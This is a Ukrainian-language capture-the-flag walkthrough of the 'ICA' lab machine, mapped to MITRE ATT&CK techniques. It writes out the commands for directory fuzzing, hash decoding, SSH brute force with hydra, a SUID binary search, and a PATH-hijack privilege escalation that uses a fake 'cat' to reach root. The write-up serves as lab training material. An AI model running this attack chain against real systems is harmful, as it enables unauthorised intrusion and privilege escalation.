# ICA

### 1. Active Scanning(T1595)

Шукаємо адрес машини

<img width="655" height="168" alt="image" src="https://github.com/user-attachments/assets/9cbcb607-ac76-42dd-904d-5bd4a1a880f6" />

Знайшли: 10.0.2.3

### 2. Network Service Scanning(T1046)

Шукаємо вiдкритi порти

<img width="1028" height="590" alt="image" src="https://github.com/user-attachments/assets/6128ea10-a6fe-4978-8ef1-ff5cb93fc0b0" />

Знайшли http, ssh i mysql. Почнемо з http

### 3. Exploit Public-Facing Application(T1190), Unsecured Credentials(T1552)

<img width="638" height="554" alt="image" src="https://github.com/user-attachments/assets/19b0e0a8-75eb-4050-971d-7edf9504b3ee" />

Бачимо, що на http знаходиться сторiнка входу. Логiн - це почта, тому admin/admin не пiдiйде.

Спробуємо пошукати iншi директорiї. Приспiшимо процес, використовуючи ffuf, бо вiн може сканувати рекурсивно

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.3/FUZZ -recursion -recursion-depth 3 -v
```

Знаходимо цiкаву директорiю:

<img width="581" height="106" alt="image" src="https://github.com/user-attachments/assets/9b429861-b0a0-48c8-a316-a47d24f99a4a" />

Переходимо:

<img width="1013" height="435" alt="image" src="https://github.com/user-attachments/assets/acc0a3f1-651e-46ff-a922-ab1240397377" />

Перевiряємо вмiст файлiв i знаходимо:

<img width="714" height="273" alt="image" src="https://github.com/user-attachments/assets/0cfac4eb-ca90-4c37-9629-a863ffdb5941" />

Данi до входу до MySQL!

### 4. Valid Accounts(T1078), Credentials from Password Stores(T1555)

Входимо:

<img width="682" height="183" alt="image" src="https://github.com/user-attachments/assets/0c952484-c69d-4f61-b481-cbc7af5231d8" />

Працює!

Пошукаємо щось корисне в цiй базi

<img width="272" height="191" alt="image" src="https://github.com/user-attachments/assets/972b57dc-c16e-4ebb-86e2-b501ad90a86a" />

### 5. Brute Force(T1110)
Маємо користувачiв i хеш паролiв. Перевiримо, що це за хеш

<img width="922" height="276" alt="image" src="https://github.com/user-attachments/assets/b0913b57-a60c-408b-b882-6f01a15898a2" />

"Base64(unhex(MD5($plaintext)))". Ми не знаємо, який користувач має який пароль, тому треба розшифрувати один i пiдiбрати до нього логiн

Записуємо цi хеши в файл hashes.txt i перетворюємо їх

```bash
while read h; do echo "$h" | base64 -d | xxd -p; done < hashes.txt > hashes_hex.txt
```

<img width="301" height="118" alt="image" src="https://github.com/user-attachments/assets/51b5e5af-9d18-494a-8ef6-a3ee8514663a" />

```bash
base64 -d hashes.txt | fold -w 16 > hashes_md5.txt
```

<img width="195" height="120" alt="image" src="https://github.com/user-attachments/assets/4af9fe3a-48ce-4d73-b334-c61a847b636e" />

Далi нам треба декодувати цi хеши, скористаємося з hashcat

### Скажу чесно, наступнi 2 години пройшли у спробах пiдiбрати пароль до хешу i використати його, але нiчого не вийшло. Як з'ясувалося, автор цього CTF - дуже цiкава людина i треба було використати хеш MD5 як пароль. У реальних випадках нiхто i нiколи так не робить

Спробуємо брут форс ssh, використовуючи логiни i паролi, що отримали з бази даних

```bash
hydra -L ICA_users.txt -P hashes_md5.txt 10.0.2.3 ssh .
```

<img width="1056" height="212" alt="image" src="https://github.com/user-attachments/assets/38ec9d71-a752-41ee-ac2b-8acfac2bd172" />

Маємо доступ!

### 6. Abuse Elevation Control Mechanism(T1548)

Перевiримо, що в нас є

<img width="654" height="468" alt="image" src="https://github.com/user-attachments/assets/1144bc17-8fe0-4bf6-bf50-ba79e3383260" />

Натяк на якусь вразливiсть виконувальних файлiв. Шукаємо, що це може бути

```bash
find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
```

<img width="749" height="223" alt="image" src="https://github.com/user-attachments/assets/9882a5cc-1156-4947-a9db-147b5df4a67c" />

Бачимо "/opt/get_access", нестандартний файл. Спробуємо запустити

<img width="717" height="208" alt="image" src="https://github.com/user-attachments/assets/fb3d0ce7-c429-478d-84e7-e26f81c0a67a" />

Жаль, нiчого не дає. Спробуємо знайти пiдказки, як цей файл працює

```bash
strings /opt/get_access
```

<img width="740" height="432" alt="image" src="https://github.com/user-attachments/assets/fd900a54-ab71-4cc9-bbb3-04b284b81ccf" />

Бачимо, що цей файл виконує команду "cat". Це наш шанс

### 7. Hijack Execution Flow(T1574), Privilege Escalation(TA0004)

Створимо власний "cat"

```bash
echo "/bin/bash" >> /tmp/cat
```

```bash
chmod +x /tmp/cat
```

Робимо його прiоритетним пiд час виконання за допомогою PATH

```bash
export PATH=/tmp:$PATH
```

Спробуємо виконати get_access зараз:

<img width="280" height="38" alt="image" src="https://github.com/user-attachments/assets/f3087df3-ded7-460c-bc3c-e0640a9280c7" />

#### Отримали root!

<img width="247" height="52" alt="image" src="https://github.com/user-attachments/assets/66f8e1b9-f580-478a-a2b3-5d6f19a5c484" />

```bash
less root.txt
```

<img width="388" height="53" alt="image" src="https://github.com/user-attachments/assets/12352e0b-dff6-4a19-9349-d576caca315d" />

### Перемога!

<img width="399" height="501" alt="image" src="https://github.com/user-attachments/assets/c604200c-7e95-4197-8988-eaa2710b8034" />
